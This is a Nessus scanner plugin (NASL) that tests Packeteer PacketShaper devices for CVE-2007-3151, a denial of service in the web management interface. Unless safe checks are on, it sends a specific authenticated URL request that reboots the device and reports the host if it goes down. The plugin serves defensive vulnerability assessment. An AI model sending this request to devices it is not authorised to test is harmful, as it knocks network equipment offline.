# nnposter
# GPL

# Changes by Tenable:
# - Revised plugin title (3/30/2009)

include("compat.inc");

if (description)
    {
    script_id(25571);
    script_version ("$Revision: 1.11 $");

    script_cve_id("CVE-2007-3151");
    script_bugtraq_id(24388);
    script_osvdb_id(37230);

    script_name(english:"Packeteer PacketShaper Web Management rpttop.htm Crafted Request Remote DoS");

 script_set_attribute(attribute:"synopsis", value:
"The remote host is affected by a denial of service vulnerability." );
 script_set_attribute(attribute:"description", value:
"Packeteer PacketShaper is susceptible to a denial of service
vulnerability in the web management interface.  Requesting a specific
URL will cause the device to reboot.  The user must first log in but
even read-only access is sufficient." );
 script_set_attribute(attribute:"see_also", value:"http://www.securityfocus.com/archive/1/470835/30/0/threaded" );
 script_set_attribute(attribute:"solution", value:
"Restrict network access to the device management interfaces." );
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:N/I:N/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:ND/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
 script_set_attribute(attribute:"plugin_publication_date", value: "2007/06/26");
 script_set_attribute(attribute:"vuln_publication_date", value: "2007/06/08");
 script_cvs_date("$Date: 2016/05/16 14:12:52 $");
 script_set_attribute(attribute:"plugin_type", value:"remote");
 script_end_attributes();


    summary["english"]="Tests for Packeteer PacketShaper web management interface DoS";
    script_summary(english:summary["english"]);

    family["english"]="CGI abuses";
    script_family(english:family["english"]);

    script_category(ACT_MIXED_ATTACK);

    script_copyright(english:"This script is Copyright (C) 2007-2016 nnposter");
    script_dependencies("packeteer_web_version.nasl", "snmp_sysDesc.nasl");
    script_require_keys("www/packeteer");
    script_require_ports("Services/www",80);
    exit(0);
    }

# Notes:
# - Does not work with http_keepalive_send_recv() for some reason.
#   Resorting to http_send_recv()


include("http_func.inc");
include("misc_func.inc");


if (!get_kb_item("www/packeteer")) exit(0);


function set_cookie (data,cookie)
{
local_var EOL,req;
EOL='\r\n';
req=ereg_replace(string:data,pattern:EOL+'Cookie:[^\r\n]+',replace:"");
req=ereg_replace(string:req,pattern:EOL+EOL,replace:EOL+cookie+EOL);
return req;
}


function get_version_snmp ()
{
local_var sys,match,ver;
sys=get_kb_item("SNMP/sysDesc");
if (!sys) return NULL;
match=eregmatch(pattern:"^Packeteer PacketShaper ([A-Za-z0-9.]+)",string:sys);
ver=match[1];
if (!ver) return NULL;
return ver;
}


port=get_http_port(default:80);
product=get_kb_item("www/"+port+"/packeteer");
if (!get_tcp_port_state(port) || product!="PacketShaper") exit(0);


if (safe_checks())
    {
    KNOWN_BROKEN_VERSION="7.5.1g1";
    version=get_kb_item("www/"+port+"/packeteer/version");
    if (!version) version=get_version_snmp();
    if (version && version =~ "^([0-6]\.|7\.([0-4]\.|5\.(0|1([a-f]|g0))))")
        {
        report = string(
          "\n",
          "The vulnerability has not been tested. The assessment is based\n",
          "solely on the device software version, which is ",version,"."
        );
        security_warning(port:port, extra:report);
        }
    exit(0);
    }

cookie=get_kb_item("/tmp/http/auth/"+port);
if (!cookie) exit(0);

if (http_is_dead(port:port)) exit(0);
req=http_get(item:"/rpttop.htm?OP.MEAS.DATAQUERY=&MEAS.TYPE=",port:port);
resp=http_send_recv(port:port,data:set_cookie(data:req,cookie:cookie));
if (!http_is_dead(port:port)) exit(0);

security_warning(port);
